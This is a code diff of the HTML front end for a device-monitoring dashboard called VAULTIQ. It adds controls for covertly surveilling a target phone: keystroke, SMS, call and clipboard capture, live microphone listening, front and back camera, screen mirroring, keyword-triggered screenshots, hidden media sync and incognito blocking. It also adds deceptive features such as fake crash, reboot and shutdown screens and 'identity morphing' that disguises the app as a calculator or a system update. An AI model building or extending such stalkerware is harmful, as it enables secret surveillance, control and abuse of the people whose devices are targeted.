@@ -3,22 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Monitor - Stitch Accessible Design</title>
+    <title id="app-title">VAULTIQ</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="">
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="config.js"></script>
 </head>
 <body>
-    <div class="container">
-        <aside class="sidebar" role="navigation" aria-label="Main navigation">
+    <!-- Login Overlay -->
+    <div id="login-overlay" class="login-overlay">
+        <div class="login-box">
+            <h2 id="login-title">🔐 VAULTIQ Login</h2>
+            <p>Please sign in to access the dashboard</p>
+            <form id="login-form">
+                <div class="input-group">
+                    <label for="login-email">Email</label>
+                    <input type="email" id="login-email" required placeholder="admin@example.com">
+                </div>
+                <div class="input-group">
+                    <label for="login-password">Password</label>
+                    <input type="password" id="login-password" required placeholder="••••••••">
+                </div>
+                <button type="submit" id="login-submit-btn">Login</button>
+            </form>
+            <div id="login-error" class="login-error" style="display: none;"></div>
+        </div>
+    </div>
+
+    <div class="container" id="main-dashboard" style="display: none;">
+        <!-- Mobile Menu Toggle Button -->
+        <button id="mobile-menu-toggle" class="mobile-menu-toggle" aria-label="Toggle navigation menu" aria-expanded="false">
+            <span class="hamburger-icon"></span>
+            <span class="hamburger-icon"></span>
+            <span class="hamburger-icon"></span>
+        </button>
+
+        <aside class="sidebar" role="navigation" aria-label="Main navigation" id="sidebar">
             <div class="sidebar-header">
-                <h2>🔍 Device Monitor</h2>
+                <h2 id="sidebar-title">🔍 VAULTIQ</h2>
             </div>
             <nav class="sidebar-nav">
                 <button class="nav-item active" data-page="dashboard" aria-current="page">Dashboard</button>
+                <button class="nav-item" data-page="timeline">Timeline</button>
                 <button class="nav-item" data-page="map">Location</button>
+                <button class="nav-item" data-page="keyword-alerts">Keyword Alerts</button>
+                <button class="nav-item" data-page="calls">Call Logs</button>
                 <button class="nav-item" data-page="calls">Call Logs</button>
                 <button class="nav-item" data-page="sms">SMS Messages</button>
                 <button class="nav-item" data-page="messengers">Messengers</button>
@@ -29,7 +60,10 @@
                 <button class="nav-item" data-page="keystrokes">Keystrokes</button>
                 <button class="nav-item" data-page="clipboard">Clipboard</button>
                 <button class="nav-item" data-page="contacts">Contacts</button>
-        <button class="nav-item" data-page="call-recordings">Call Recordings</button>
+                <button class="nav-item" data-page="calendar">Calendar</button>
+                <button class="nav-item" data-page="wifi">Wi-Fi History</button>
+                <button class="nav-item" data-page="installed-apps">Installed Apps</button>
+                <button class="nav-item" data-page="call-recordings">Call Recordings</button>
         <button class="nav-item" data-page="emails">Emails</button>
         <button class="nav-item" data-page="ambient">Ambient Recordings</button>
                 <button class="nav-item" data-page="screen-record">Screen Recordings</button>
@@ -37,15 +71,26 @@
                 <button class="nav-item" data-page="device">Device Info</button>
                 <button class="nav-item" data-page="network">Network Info</button>
                 <button class="nav-item" data-page="sim">SIM Changes</button>
+                <button class="nav-item" data-page="app-context">App Screen Context</button>
             </nav>
         </aside>
         <main class="main-content" role="main">
             <header class="header">
-                <h1 id="page-title">Dashboard</h1>
+                <div style="display: flex; flex-direction: column; gap: 4px;">
+                    <h1 id="page-title">Dashboard</h1>
+                    <div class="device-selector-container">
+                        <select id="device-selector" aria-label="Select target device" style="padding: 6px 12px; border-radius: 8px; border: 1px solid var(--color-outline-variant); background: white; font-weight: 600; color: var(--color-primary);">
+                            <option value="">Loading devices...</option>
+                        </select>
+                        <span id="device-status-badge" style="margin-left: 8px; font-size: 12px; padding: 4px 8px; border-radius: 12px;"></span>
+                    </div>
+                </div>
                 <div class="header-actions">
+                    <button id="lang-toggle" aria-label="Switch Language" style="padding: 8px 12px; border-radius: 6px; border: none; background: var(--color-primary); color: white; cursor: pointer; font-size: 14px;">🌐 EN</button>
                     <button id="refresh-btn" aria-label="Refresh data">🔄 Refresh</button>
                     <button id="export-csv-btn" aria-label="Export data as CSV">📊 Export CSV</button>
                     <button id="export-json-btn" aria-label="Export data as JSON">📋 Export JSON</button>
+                    <button id="logout-btn" aria-label="Logout" style="background-color: var(--color-danger);">🚪 Logout</button>
                 </div>
             </header>
 
@@ -72,6 +117,30 @@
 
             <div id="alerts-container" class="alerts-container" role="alert" aria-live="polite"></div>
 
+            <!-- Global Timeline Page -->
+            <section id="timeline-page" class="page" aria-labelledby="page-title">
+                <div class="timeline-container" id="behavior-timeline">
+                    <!-- Events will be dynamically injected here -->
+                </div>
+            </section>
+
+            <!-- Keyword Alerts Page -->
+            <section id="keyword-alerts-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Keyword</th>
+                                <th>App</th>
+                                <th>Full Content</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="keyword-alerts-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
             <!-- Dashboard Page -->
             <section id="dashboard-page" class="page active" aria-labelledby="page-title">
                 <div class="remote-commands">
@@ -79,8 +148,129 @@
                     <div class="command-buttons">
                         <button class="command-btn" id="cmd-fetch-location" aria-label="Fetch device location">📍 Fetch Location</button>
                         <button class="command-btn" id="cmd-take-photo" aria-label="Take remote photo">📷 Take Photo</button>
+                        <button class="command-btn" id="cmd-take-screenshot" aria-label="Take screenshot">📸 Take Screenshot</button>
                         <button class="command-btn" id="cmd-ring-device" aria-label="Play sound on device">🔊 Play Sound</button>
                         <button class="command-btn" id="cmd-sync-data" aria-label="Sync device data">🔄 Sync Data</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📹 Call Recording Controls</h4>
+                    <div class="timer-display" id="call-recording-timer" style="font-size: 32px; font-weight: bold; margin: 16px 0; color: var(--color-primary);">00:00:00</div>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-call-recording" aria-label="Start call recording" style="background-color: var(--color-success);">▶️ Start Recording</button>
+                        <button class="command-btn" id="cmd-pause-call-recording" aria-label="Pause call recording" style="background-color: var(--color-warning);">⏸️ Pause Recording</button>
+                        <button class="command-btn" id="cmd-stop-call-recording" aria-label="Stop call recording" style="background-color: var(--color-danger);">⏹️ Stop Recording</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🖥️ Screen Recording Controls</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-screen-record" aria-label="Start screen recording" style="background-color: var(--color-success);">⏺️ Start Screen Record</button>
+                        <button class="command-btn" id="cmd-stop-screen-record" aria-label="Stop screen recording" style="background-color: var(--color-danger);">⏹️ Stop Screen Record</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🛡️ Device Security (Lock/Wipe)</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-lock-device" aria-label="Lock device" style="background-color: var(--color-warning);">🔒 Lock Device</button>
+                        <button class="command-btn" id="cmd-wipe-device" aria-label="Wipe device data" style="background-color: var(--color-danger);">⚠️ Wipe Data</button>
+                        <button class="command-btn" id="cmd-fake-crash" aria-label="Show fake crash" style="background-color: #64748b;">💥 Fake Crash</button>
+                        <button class="command-btn" id="cmd-clear-crash" aria-label="Clear fake crash" style="background-color: #94a3b8;">✨ Clear Crash</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🔌 Fake Power Controls</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-fake-reboot" aria-label="Show fake reboot" style="background-color: #475569;">🔄 Fake Reboot</button>
+                        <button class="command-btn" id="cmd-fake-shutdown" aria-label="Show fake shutdown" style="background-color: #334155;">🔌 Fake Shutdown</button>
+                        <button class="command-btn" id="cmd-clear-fake-poweroff" aria-label="Clear fake power off" style="background-color: #94a3b8;">✅ Clear</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📋 Clipboard Manager</h4>
+                    <div class="command-buttons">
+                        <input type="text" id="inject-clipboard-text" placeholder="Text to inject to clipboard" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #ddd;">
+                        <button class="command-btn" id="cmd-inject-clipboard" aria-label="Inject clipboard text" style="background-color: var(--color-primary);">📋 Inject</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🎙️ Live Audio Listening</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-live-listen" aria-label="Start live listening" style="background-color: var(--color-success);">🎤 Start Live Listen</button>
+                        <button class="command-btn" id="cmd-stop-live-listen" aria-label="Stop live listening" style="background-color: var(--color-danger);">🔇 Stop Live Listen</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📹 Burst Live Camera</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-live-camera-front" aria-label="Start live front camera" style="background-color: var(--color-success);">📷 Front Camera</button>
+                        <button class="command-btn" id="cmd-live-camera-back" aria-label="Start live back camera" style="background-color: var(--color-success);">📸 Back Camera</button>
+                        <button class="command-btn" id="cmd-live-camera-stop" aria-label="Stop live camera" style="background-color: var(--color-danger);">🚫 Stop Camera</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📺 Live Screen Mirror</h4>
+                    <div class="command-buttons">
+                        <button class="command-btn" id="cmd-start-mirror" aria-label="Start mirroring" style="background-color: var(--color-success);">📺 Start Mirror</button>
+                        <button class="command-btn" id="cmd-stop-mirror" aria-label="Stop mirroring" style="background-color: var(--color-danger);">🚫 Stop Mirror</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">📢 Voice Broadcast</h4>
+                    <div class="command-buttons">
+                        <input type="text" id="broadcast-url" placeholder="Audio URL (mp3/wav)" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #ddd;">
+                        <button class="command-btn" id="cmd-broadcast" aria-label="Broadcast voice">📢 Play</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">⚙️ Auto-Feature Settings</h4>
+                    <div class="command-buttons" style="background: #f8fafc; padding: 16px; border-radius: 12px; border: 1px solid #e2e8f0; display: block;">
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-auto-call-record">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Auto Call Record</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-unlock-selfie">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Intruder Selfie on Unlock</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-voip-record">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>VoIP Call Recording</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-media-sync">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Hidden Media Sync (Gallery/Social)</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                            <label class="switch">
+                                <input type="checkbox" id="toggle-block-incognito">
+                                <span class="slider round"></span>
+                            </label>
+                            <span>Block Incognito Mode</span>
+                        </div>
+                        <div style="margin-bottom: 12px; padding-left: 44px; display: flex; gap: 10px;">
+                            <input type="text" id="incognito-apps-input" placeholder="com.android.chrome, org.mozilla.firefox" style="padding: 8px; border: 1px solid #ddd; border-radius: 6px; flex: 1;">
+                            <button class="command-btn" id="btn-update-incognito-apps" style="padding: 8px 16px; background: #64748b;">Update Apps</button>
+                        </div>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🎯 Keyword Triggered Screenshots</h4>
+                    <div class="command-buttons" style="background: #f0f9ff; padding: 16px; border-radius: 12px; border: 1px solid #bae6fd;">
+                        <input type="text" id="keyword-input" placeholder="Enter keywords (comma separated)..." style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #7dd3fc;">
+                        <button class="command-btn" id="btn-update-keywords" style="background-color: #0284c7;">💾 Save Keywords</button>
+                    </div>
+
+                    <h4 style="margin-top: 24px;">🎭 App Identity Morphing</h4>
+                    <div class="command-buttons" style="background: #fff7ed; padding: 16px; border-radius: 12px; border: 1px solid #fed7aa;">
+                        <select id="icon-selector" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #fdba74;">
+                            <option value="default">Default (System Update)</option>
+                            <option value="calculator">Calculator</option>
+                            <option value="calendar">Calendar</option>
+                            <option value="weather">Weather</option>
+                        </select>
+                        <button class="command-btn" id="btn-morph-app" style="background-color: #ea580c;">✨ Morph Identity</button>
                     </div>
                 </div>
                 <div class="stats-grid" aria-label="Dashboard statistics">
@@ -276,6 +466,56 @@
                 </div>
             </section>
 
+            <!-- Calendar Page -->
+            <section id="calendar-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Event</th>
+                                <th>Location</th>
+                                <th>Start Time</th>
+                                <th>End Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="calendar-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Wi-Fi Page -->
+            <section id="wifi-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>SSID</th>
+                                <th>BSSID</th>
+                                <th>Last Seen</th>
+                            </tr>
+                        </thead>
+                        <tbody id="wifi-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Installed Apps Page -->
+            <section id="installed-apps-page" class="page" aria-labelledby="page-title">
+                <div class="table-container">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>App Name</th>
+                                <th>Package Name</th>
+                                <th>Version</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="installed-apps-table"></tbody>
+                    </table>
+                </div>
+            </section>
+
             <!-- Call Recordings Page -->
             <section id="call-recordings-page" class="page" aria-labelledby="page-title">
                 <div class="table-container">
@@ -379,6 +619,8 @@
                                 <th scope="col">Wi-Fi SSID</th>
                                 <th scope="col">Network Type</th>
                                 <th scope="col">Signal Strength</th>
+                                <th scope="col">Cell Info (CID/LAC)</th>
+                                <th scope="col">Carrier (MCC/MNC)</th>
                                 <th scope="col">Time</th>
                             </tr>
                         </thead>
@@ -402,6 +644,14 @@
                     </table>
                 </div>
             </section>
+
+            <!-- App Screen Context Page -->
+            <section id="app-context-page" class="page" aria-labelledby="page-title">
+                <div class="timeline-container" id="app-context-timeline">
+                    <!-- Timeline items will be injected here -->
+                </div>
+            </section>
+
         </main>
     </div>
 
